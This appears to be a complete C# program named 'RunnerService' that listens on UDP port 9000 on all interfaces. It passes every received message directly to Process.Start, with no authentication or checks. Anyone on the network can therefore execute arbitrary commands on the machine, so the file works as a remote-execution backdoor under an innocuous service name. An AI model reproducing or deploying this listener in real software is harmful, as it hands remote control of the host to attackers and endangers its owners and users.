using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace RunnerService
{
  internal static class Program
  {
    private static void Main()
    {
      using var server = new UdpClient(9000);
      var ip = new IPEndPoint(IPAddress.Any, 0);
 
      while (true)
      {
        var bytes = server.Receive(ref ip);
        var data = Encoding.Default.GetString(bytes);
        Process.Start(data);
      }
    }
  }
}